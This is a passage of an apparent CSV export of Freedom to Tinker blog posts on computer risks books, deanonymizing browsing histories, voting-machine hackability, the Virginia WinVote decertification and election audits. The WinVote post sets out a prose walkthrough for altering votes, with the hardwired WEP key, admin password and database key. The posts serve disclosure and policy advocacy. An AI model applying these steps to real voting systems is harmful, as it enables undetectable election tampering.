now call mashup. Eventually they ran afoul of the megaband “U2”, and their struggles over copyright and fair use are documented here. The book in part was created as something of a legal shield as Negativland went through its legal dramas and is an excellent introduction to the still-unresolved dilemmas surrounding creators’ rights in an era of unlimited reproduction. “Computer-Related Risks”. Peter Neumann, 1994. Peter Neumann was a senior computer scientist at the Silicon Valley-based industrial lab SRI (psst: where Siri came from); “risks” was a longstanding list-serv where people documented all the ways software can fail and go wrong and the harm these failures can cause. This book is sort of the best of (worst of?) “risks”. “The Cult of Information”. Theodore Roszak, 1986. Rozak was trained as a historian and is best known for writing the seminal/germinal “The Making of the Counterculture”. This book is eerily proleptic in how it limns so many current controversies over IT’s potential adverse effects on creativity and humanity; special callout to concerns over educational software. “Silicon Follies”. Thomas Scoville, 2000. Thomas Scoville grew up in Northern California and started working with computers in the late 1970s, ending his career as a programmer in Silicon Valley in the year 2000. His first spot-on comic creation was “The Silicon Valley Tarot”, published by the famous Steve Jackson Games out of Austin. Scoville did the illustrations himself for the card deck, which featured major arcana such as “The Hacker” and minor arcana such as “Five of Cubicles”, and the whole deal remains remarkably au courant. Next up was “Silicon Follies”, which ran as a satirical serial on Salon.com. A pilot was made of “Follies” for Ron Howard’s Imagine Entertainment production company—and that’s as far as it went until the homage paid to it by today’s HBO dramedy, “Silicon Valley”."
"459","2016-09-28","2023-03-24","https://freedom-to-tinker.com/2016/09/28/are-you-really-anonymous-online/","As you browse the internet, online advertisers track nearly every site you visit, amassing a trove of information on your habits and preferences. When you visit a news site, they might see you’re a fan of basketball, opera and mystery novels, and accordingly select ads tailored to your tastes. Advertisers use this information to create highly personalized experiences, but they typically don’t know exactly who you are. They observe only your digital trail, not your identity itself, and so you might feel that you’ve retained a degree of anonymity. In new work with Ansh Shukla, Sharad Goel and Arvind Narayanan, we show that these anonymous web browsing records can in fact often be tied back to real-world identities. (Check out our demo, and see if we can figure out who you are.) At a high level, our approach is based on a simple observation. Each person has a highly distinctive social network, comprised of family and friends from school, work, and various stages throughout one’s life. As a consequence, the set of links in your Facebook and Twitter feeds is likewise highly distinctive, and clicking on these links leaves a tell-tale mark in your browsing history. Given only the set of web pages an individual has visited, we determine which social media feeds are most similar to it, yielding a list of candidate users who likely generated that web browsing history. In this manner, we can tie a person’s real-world identity to the near complete set of links they have visited, including links that were never posted on any social media site. This method requires only that one click on the links appearing in their social media feeds, not that they post any content. Carrying out this strategy involves two key challenges, one theoretical and one engineering. The theoretical problem is quantifying how similar a specific social media feed is to a given web browsing history. One simple similarity measure is the fraction of links in the browsing history that also appear in the feed. This metric works reasonably well in practice, but it overstates similarity for large feeds, since those simply contain more links. We instead take an alternative approach. We posit a stylized, probabilistic model of web browsing behavior, and then compute the likelihood a user with that social media feed generated the observed browsing history. It turns out that this method is approximately equivalent to scaling the fraction of history links that appear in the feed by the log of the feed size. The engineering challenge is identifying the most similar feeds in real time. Here we turn to Twitter, since Twitter feeds (in contrast to Facebook) are largely public. However, even though the feeds are public, we cannot simply create a local copy of Twitter against which we can run our queries. Instead we apply a series of heuristics to dramatically reduce the search space. We then combine caching techniques with on-demand network crawls to construct the feeds of the most promising candidates. On this reduced candidate set, we apply our similarity measure to produce the final results. Given a browsing history, we can typically carry out this entire process in under 60 seconds. Our initial tests indicate that for people who regularly browse Twitter, we can deduce their identity from their web browsing history about 80% of the time. Try out our web application, and let us know if it works on you!"
"460","2016-09-20","2023-03-24","https://freedom-to-tinker.com/2016/09/20/which-voting-machines-can-be-hacked-through-the-internet/","Over 9000 jurisdictions (counties and states) in the U.S. run elections with a variety of voting machines: optical scanners for paper ballots, and direct-recording “touchscreen” machines. Which ones of them can be hacked to make them cheat, to transfer votes from one candidate to another? The answer: all of them. An attacker with physical access to a voting machine can install fraudulent vote-miscounting software. I’ve demonstrated this on one kind of machine, others have demonstrated it on other machines. It’s a general principle about computers: they run whatever software is installed at the moment. So let’s ask: Which voting machines can be hacked from anywhere in the world, through the Internet? Which voting machines have other safeguards, so we can audit or recount the election to get the correct result even if the machine is hacked? The answers, in summary: Older machines (Shouptronic, AVC Advantage, AccuVote OS, Optech-III Eagle) can be hacked by anyone with physical access; newer machines (almost anything else in use today) can be hacked by anyone with physical access, and are vulnerable to attacks from the Internet. Optical scan machines, even though they can be hacked, allow audits and recounts of the paper ballots marked by the voters. This is a very important safeguard. Paperless touchscreen machines have no such protection. “DRE with VVPAT” machines, i.e. touchscreens that print on paper (that the voter can inspect under glass while casting the ballot) are “in between” regarding this safeguard. The most widely used machine that fails #1 and #2 is the AccuVote TS, used throughout the state of Georgia, and in some counties in other states. And now, the details. To hack a voting machine remotely, you might think it has to be plugged in to the Internet. Most voting machines are never plugged directly into the Internet. But all voting machines must accept electronic input files from other computers: these “ballot definition files” tell the vote-counting program which candidates are on the ballot. These files are transferred to the voting machine, before each election, by inserting a cartridge or memory card into the voting machine. These cartridges are prepared on an Election Management System (EMS) computer. If that computer is hacked, then it can prepare fraudulent ballot-definition cartridges. Are those EMS computers ever connected to the Internet? Most of them probably are, from time to time; it’s hard to tell for sure, given the equivocations of many election administrators. The ballot definition is (supposed to be) just data, not a computer program. So how could it convey and install a new (fraudulent) vote-counting program onto the voting machine? Voting machines designed in the 1980s (Shouptronic, AVC Advantage, AccuVote OS, Optech-III Eagle) store their programs in EPROM (Erasable Programmable Read-Only Memory). To install a new program, you need to remove the EPROM chips from the motherboard and install new ones. (Then you can reprogram and reuse the old ones using an EPROM “burner” device.) Those machines are not likely hackable through the Internet, even indirectly via corrupted EMS computers. (What if the EMS sends fraudulent ballot definition cartridges? This should be detectable through pre-election Logic and Accuracy testing, if it’s thorough. And in some cases it can be detected/corrected even after the election.) Voting machines designed in the 1990s and 2000s took advantage of a new nonvolatile storage technology that we now take for granted: flash memory. They don’t use EPROMs to store the vote-counting program, it’s kept in flash. That flash memory is writable (reprogrammable) from inside the voting computer. Almost any kind of computer needs a mechanism to install software updates. For most voting computers that use flash memory, the upgrade process is simple: install a cartridge that has the new firmware. For example, the Diebold AccuVote TS examines the ballot-definition cartridge; if there’s a file present called fboot.nb0 instead of (or in addition to) the ballot-definition file, then it installs fboot.nb0 as the new bootloader! Using this mechanism, it’s easy and convenient to install new firmware, but it’s also easy and convenient to install fraudulent vote-counting programs. It’s not just the AccuVote TS that installs new firmware this way. This technique was industry-standard for all kinds of equipment (not just voting machines) in the 1990s. We can assume that it’s used on all voting computers that use flash memory. (One might imagine–one might hope–that after the voting-equipment industry came to understand this issue by reading the Feldman et al. paper, they would use a cryptographic authentication mechanism to accept only digitally signed firmware updates. But since the voting-equipment designers undoubtedly connect their own computers to the Internet, determined hackers could infiltrate and steal the signing keys.) Some recent voting machines use PDF files as part of ballot definitions; PDF can contain all sorts of executable content through which hack attacks can be mounted. Based on this analysis, we summarize what we know about these models of voting machines: There are many more kinds of voting machines in use; I’ve just listed a few of them here. Name Kind How hackable? Paper recountable? The worst: remote hackable, no paper trail AccuVote TS DRE Internet or local No WinVote DRE Internet or WiFi or local No iVotronic (newer models) DRE Internet? (we don’t know [Note 2]) or Local No Pretty bad: need physical presence to hack, no paper trail AVC Advantage 9 [Note 3] DRE Local only No Shouptronic DRE Local only No iVotronic (older models) DRE local No Not so bad: Hackable remotely (in principle), but with auditable/recountable paper trail* iVotronic with “real-time audit log” DRE with VVPAT Internet? (we don’t know [Note 2]) or local Sort of [Note 1] Better: Hackable remotely (in principle), but has auditable/recountable paper ballots that the voter actually marked ES&S Model 100 Optical Scan Internet? (we don’t know [Note 4]) or local Yes ES&S DS200 Optical Scan Internet [Note 4] or local Yes Best: Need physical presence to hack, but has an auditable/recountable paper ballots that the voter actually marked AccuVote OS Optical Scan Local only Yes Optech-III Eagle Optical Scan Local only Yes For more information . . . You can find out what voting machines are used in your state and county, and you can also find descriptions of the voting machines. And remember, those paper ballots only protect against hacking if someone actually looks at (some of) them in an audit. Note 1: “Sort of.” DRE with VVPAT, that is, Direct-Recording Electronic (touchscreen) voting machine with Voter-Verified Paper Audit Trail. This allows the voter to see his/her votes, printed on paper, behind glass; the voter can in principle confirm that the correct selections are printed, but most voters don’t do this; election officials can in principle recount the paper that the voter actually saw, but the format can make recounts difficult. This technology is a kind of voter-verified paper trail that’s recountable by hand, so it’s protection against hacked computers. But it’s not as good as optical-scan paper ballots that the voters actually marked themselves. Note 2: Doug Jones writes, “Early versions of the iVotronic use flash memory (not EPROM), but changing the firmware was done by opening the case and either doing a chip swap or by using an external programmer to reflash the chips. Later versions, after they added the Compact Flash card interface, could have allowed reflashing the firmware from the CF card. I do not know if they did this. There’s a strong security argument to not do it, and there’s a strong convenience argument to do it. I believe they understood both arguments back at the time I dug into the guts of the iVotronic.” Note 3: AVC Advantage models 1 through 9 count votes on a Z80 computer, executing from ROM. Model 10 still has a Z80 motherboard, but an 80386 daughterboard counts the votes; this daughterboard has flash memory and the a potentially hackable-by-cartridge interface. Some versions of the Model 10 have a VVPAT printer. I am not sure that any states use the Model 10; I believe NJ and LA still use the model 9. (See “Daughterboard vulnerabilities” in this paper.) Note 4: This machine uses flash memory to store its program, but I don’t know whether it accepts firmware upgrades on the same cards that are used to carry ballot definitions."
"461","2015-04-15","2023-03-24","https://freedom-to-tinker.com/2015/04/15/decertifying-the-worst-voting-machine-in-the-us/","On Apr 14 2015, the Virginia State Board of Elections immediately decertified use of the AVS WinVote touchscreen Direct Recording Electronic (DRE) voting machine. This seems pretty minor, but it received a tremendous amount of pushback from some local election officials. In this post, I’ll explain how we got to that point, and what the problems were. As one of my colleagues taught me, BLUF – Bottom Line Up Front. If an election was held using the AVS WinVote, and it wasn’t hacked, it was only because no one tried. The vulnerabilities were so severe, and so trivial to exploit, that anyone with even a modicum of training could have succeeded. They didn’t need to be in the polling place – within a few hundred feet (e.g., in the parking lot) is easy, and within a half mile with a rudimentary antenna built using a Pringles can. Further, there are no logs or other records that would indicate if such a thing ever happened, so if an election was hacked any time in the past, we will never know. Now for some background. The AVS WinVote is a Windows XP Embedded laptop with a touchscreen. Early versions of the software ran the Windows 2000 (an election official told me about playing solitaire on the device, to demonstrate just how complete it was). Later versions ran a somewhat cut-down version, although it’s not clear to me how much it was actually cut down. The WinVote system was certified as meeting the Voting Systems Standards (VSS) of 2002, and was approved for use in Virginia, Pennsylvania, and Mississippi. (It was decertified a few years ago in Pennsylvania, and Mississippi also stopped using theirs a few years ago after some malfunction that I can’t recall in Hinds County.) [A later version of the software was submitted for certification to the Election Assistance Commission, but never approved. I don’t know if that version solved any of the problems described here.] So how did Virginia get to decertification? It seems that in the November 2014 election, voting machines in one precinct were repeatedly crashing, and it was hypothesized to be due to some interference from someone trying to download music using their iPhone. (There were other problems with other brands of voting machines, but I’m going to focus on the WinVote.) The State Board of Elections invited the Virginia Information Technology Agency (VITA, the agency charged with providing IT services to the state government) to investigate the problem. The report, which was released on Apr 14, includes a litany of problems. [I still don’t understand how the iPhone interfered with the system, but that’s not really important at this point.] I’ve been in the security field for 30 years, and it takes a lot to surprise me. But the VITA report really shocked me – as bad as I thought the problems were likely to be, VITA’s five-page report showed that they were far worse. And the WinVote system was so fragile that it hardly took any effort. While the report does not state how much effort went into the investigation, my estimation based on the description is that it was less than a person week. Among the goodies VITA found: The wireless connection uses WEP (which we knew). What we didn’t know is that a few minutes of wireless monitoring showed that the encryption key is “abcde”, and that key is unchangeable. The system hasn’t been patched since 2004 (which we knew). What we didn’t know is that the system is running a whole bunch of open ports with active services. The report specifically notes that ports 135/tcp, 139/tcp, 445/tcp, 3389/tcp, 6000/tcp and 16001/tcp are all running unpatched services. (Layman’s explanation: the voting machines aren’t just voting machines, they’re also servers happy to give you whatever files you ask for, and various other things, if only you ask. Think of them as an extra disk drive on the network, that just happens to hold all of the votes.) (Obdisclosure: In retrospect, I *probably* could have figured this out a few years ago when I had supervised access to a WinVote with a shell prompt, but I didn’t think of checking.) The system has a weak set of controls – it’s easy to get to a DOS prompt (which we knew). What we didn’t know is that the administrator password seems to be hardwired to “admin”. The database is a very obsolete version of Microsoft Access, and uses a very weak encryption key (which I knew a couple years ago, but didn’t want to disclose – the key is “shoup”, as also disclosed in the VITA report). What we didn’t know is that there are no controls on changing the database – if you copy the database to a separate machine, which is easy to do given the file services described above, edit the votes, and put it back, it’s happy as can be, and there are no controls to detect that the tampering occurred. The USB ports and other physical connections are only marginally physically protected from tampering. What we didn’t know is that there’s no protections once you plug something into one of these ports. What this means is that someone with even a few minutes unsupervised with one of the machines could doubtless replace the software, modify results, etc. This is by far the hardest of the attacks that VITA identified, so it’s almost irrelevant given how severe the other problems are. And so on. The amazing thing is that to find all this, VITA just scratched the surface, and mostly used off-the-shelf open source tools – nothing special. They didn’t have access to source code, or any advanced tools. Or said in other words, anyone within a half mile could have modified every vote, undetected. So how would someone use these vulnerabilities to change an election? Take your laptop to a polling place, and sit outside in the parking lot. Use a free sniffer to capture the traffic, and use that to figure out the WEP password (which VITA did for us). Connect to the voting machine over WiFi. If asked for a password, the administrator password is “admin” (VITA provided that). Download the Microsoft Access database using Windows Explorer. Use a free tool to extract the hardwired key (“shoup”), which VITA also did for us. Use Microsoft Access to add, delete, or change any of the votes in the database. Upload the modified copy of the Microsoft Access database back to the voting machine. Wait for the election results to be published. Note that none of the above steps, with the possible exception of figuring out the WEP password, require any technical expertise. In fact, they’re pretty much things that the average office worker does on a daily basis. Was it really necessary to decertify immediately? As quoted in the Washington Post, Richard Herrington, secretary of the Fairfax City Electoral Board said “No matter how much time, money and effort we could put into a device or a system to make it as secure as possible, there is always the possibility that someone else would put in the time, money and effort to exploit that system”. Herrington is wrong – this isn’t a remote possibility, but an almost certain reality. A high school student could perform undetectable tampering, perhaps without even leaving their bedroom. In short, the SBE’s decision was right. Now that the information is public on just how weak the systems are, it is inevitable that someone will try it out, and it will take only minutes to manipulate an election. Why doesn’t the vendor just fix the problems? Well, they went out of business five years ago. Their domain is now owned by a Chinese organization of some sort. And even if they were still in business, this isn’t a matter of fixing a few problems – what VITA found was undoubtedly the tip of the iceberg. Bottom line is that *if* no Virginia elections were ever hacked (and we have no way of knowing if it happened), it’s because no one with even a modicum of skill tried. The Diebold machines that got lots of bad press a few years ago were 100 times more secure than the WinVote. Replacing these machines in time for a primary in two months will not be easy. I feel for the local election officials who will have many sleepless nights to replace the WinVote systems. But once the State Board of Election learned just how vulnerable they are, they had no choice – it would have been criminally negligent to continue to use a system this vulnerable. [Updated 4/15/15: Added step to possibly provide an administrator password.] [Updated 4/15/15: Added a mention that the vendor is out of business, and so can’t fix the problems.]"
"462","2016-08-17","2023-03-24","https://freedom-to-tinker.com/2016/08/17/security-against-election-hacking-part-1-software-independence/","There’s been a lot of discussion of whether the November 2016 U.S. election can be hacked. Should the U.S. Government designate all the states’ and counties’ election computers as “critical cyber infrastructure” and prioritize the “cyberdefense” of these systems? Will it make any difference to activate those buzzwords with less than 3 months until the election? First, let me explain what can and can’t be hacked. Election administrators use computers in (at least) three ways: To maintain voter registration databases and to prepare the “pollbooks” used at every polling place to list who’s a registered voter (for that precinct); to prepare the “ballot definitions” telling the voting machines who are the candidates in each race. Inside the voting machines themselves, the optical-scan counters or touch-screen machines that the voter interacts with directly. When the polls close, the vote totals from all the different precincts are gathered (this is called “canvassing”) and aggregated together to make statewide totals for each candidate (or district-wide totals for congressional candidates). Any of these computers could be hacked. What defenses do we have? Could we seal off the internet so the Russians can’t hack us? Clearly not; and anyway, maybe the hacker isn’t the Russians—what if it’s someone in your opponent’s political party? What if it’s a rogue election administrator? The best defenses are ways to audit the election and count the votes outside of, independent of the hackable computers. For example, Once the pollbooks are printed (a few days before the election), they can be inspected or audited (by election administrators, or by credentialed designates representing the candidates and political parties) to make sure that no names have been left off (or no illegitimate names have been added). A “spot-check” (a randomized partial audit) may do as well. The list of registered voters is a public record, so all the information is available to do this spot-check.Even if no one spot-checks in advance: If a legitimate voter shows up at the polling place and their name has been left off the pollbook (via computer hacking?), this is a real problem—but at least it’s a detected problem. It would be hard to get away with large-scale election-theft this way without a big story in the newspapers. (See: voter-registration purge in Florida 2000.) Problem: What if the pollbooks are not printed in advance, but they are “live” in laptop or tablet computers at the polling places? Then it’s harder to audit in advance: if the pollbook computers are hacked, we won’t know until election day. But at least we’ll know. And the use of provisional ballots can ameliorate this kind of disaster.Recommendation: paper voter-lists in the precincts, as backup to the electronic pollbook system; credentialed party representatives and citizens permitted to inspect/audit these in advance. When provisional ballots are used, officials must systematically check the provisional ballot envelopes and tally the field that tells the reason why the voter was not issued a regular ballot. What if the voting machines in the precinct are hacked? With optical-scan voting, the voter fills in the bubbles next to the names of her selected candidates on paper ballot; then she feeds the op-scan ballot into the optical-scan computer. The computer counts the vote, and the paper ballot is kept in a sealed ballot box. The computer could be hacked, in which case (when the polls close) the voting-machine lies about how many votes were cast for each candidate. But we can recount the physical pieces of paper marked by the voter’s own hands; that recount doesn’t rely on any computer. Instead of doing a full recount of every precinct in the state, we can spot-check just a few ballot boxes to make sure they 100% agree with the op-scan computers’ totals. Problem: What if it’s not an optical-scan computer, what if it’s a paperless touchscreen (“DRE, Direct-Recording Electronic) voting computer? Then whatever numbers the voting computer says, at the close of the polls, are completely under the control of the computer program in there. If the computer is hacked, then the hacker gets to decide what numbers are reported. There are no paper ballots to audit or recount. All DRE (paperless touchscreen) voting computers are susceptible to this kind of hacking. This is our biggest problem. Fortunately, only about 6 states (and several counties in another few states) use paperless touchscreen voting machines (“DRE without VVPAT”). Almost all the states in the U.S. have moved to optical-scan voting (“Paper ballots”), which is much more defensible against hacking. Voters in states with paperless touch-screen voting machines should write to their state legislators and to their governor, to ask that their state switch over to optical-scan voting machines. (It’s too late to switch before the 2016 election.) Some of the states with heaviest use of touch-screen voting machines are: Louisiana, New Jersey, Pennsylvania, Georgia, South Carolina, Tennessee, Texas, Delaware, Kentucky. On-line (internet) voting is another kind of paperless computer voting, and it’s very easy to hack. On-line voting should never be used for elections that really matter. Aggregating the precinct totals together: Those computers can be hacked too. Fortunately, we can independently audit this addition. In most states, in every precinct at the close of the polls the vote totals for that precinct are announced in public, right there in the precinct. Typically, the voting machine prints out the totals on a cash-register tape, and that printout is signed by the pollworkers and the designated party challengers, and any citizen can observe this process and copy down the numbers from the printout. Well organized political parties collect this information from every precinct, at the close of the polls, and add it up themselves, just in case the County Clerk’s software has been hacked. In fact, a good County Clerk will add it up herself or himself independently of the election-equipment vendor’s highly automated (but hackable) software, just to be sure. Problem: Some states don’t have a tradition of political parties organizing volunteers to witness and collect this data; in some states, there’s not a clear statutory right for citizens to observe this process. These problems are fixable before this November’s election; election officials should do everything they can to encourage citizen participation in this part of the canvassing process. So the good news is: our election system has many checks and balances so we don’t have to trust the hackable computers to tell us who won. The biggest weaknesses are DRE paperless touchscreen voting machines used in a few states, which are completely unacceptable; and possible problems with electronic pollbooks. In this article I’ve discussed paper trails: pollbooks, paper ballots, and per-precinct result printouts. Election officials must work hard to assure the security of the paper trail: chain of custody of ballot boxes once the polls close, for example. And they must use the paper trails to audit the election, to protect against hacked computers (and other kinds of fraud, bugs, and accidental mistakes). Many states have laws requiring (for example) random audits of paper ballots; more states need such laws, and in all states the spirit of the laws must be followed as well as the letter. In Part 2 of this series, I’ll discuss cybersecurity policy for election infrastructure."
"463","2016-08-10","2023-03-24","https://freedom-to-tinker.com/2016/08/10/the-workshop-on-data-and-algorithmic-transparency/","From online advertising to Uber to predictive policing, algorithmic systems powered by personal data affect more and more of our lives. As our society begins to grapple with the consequences of this shift, empirical investigation of these systems has proved vital to understand the potential for discrimination, privacy breaches, and vulnerability to manipulation. This emerging field of research, which we’re calling Data and Algorithmic Transparency, seems poised to grow dramatically. But it faces a number of methodological challenges which can only be solved by bringing together expertise from a variety of disciplines. That is why Alan Mislove and I are organizing the first workshop on Data and Algorithmic Transparency at Columbia University on Nov 19, 2016. Here are three reasons you should participate in this workshop. Start of a new, interdisciplinary community. The set of disciplines represented on the Program Committee is strikingly diverse: Internet measurement, information privacy/security, computer systems, human-computer interaction, law, and media studies. Industrial research and government are also represented. We expect the workshop itself to have a similar mix of participants, and that is exactly what is needed to make transparency research a success. Alan and I (and others including Nikolaos Laoutaris) are committed to growing and nurturing this community over the next several years. Co-located with two other exciting events: the Data Transparency Lab conference (DTL ‘16) and the Fairness, Accountability, and Transparency in Machine Learning workshop (FAT-ML ‘16). DTL shares many of the goals of the DAT workshop, but is non-academic. FAT-ML has a complementary relationship with the goals of DAT: it seeks to develop machine learning techniques for developers of algorithmic systems to improve fairness and accountability, whereas DAT seeks to analyze existing systems, typically “from the outside”. The events are consecutive and non-overlapping, and participants of each event are encouraged to attend the others. A format that makes the most of everyone’s time. At most computer science conferences, each speaker mumbles through their slides while the audience is a sea of laptops, awaiting their turn. DAT will be the opposite. We plan to have paper discussions instead of paper presentations, with commenters and participants, rather than authors, doing most of the speaking about each paper. This first edition of DAT will be non-archival (but peer-reviewed), and one goal of the discussions is to help authors improve their papers for later publication. We are also soliciting talk proposals about already published work; groups of accepted talks will be organized into panels. See you in New York City!"
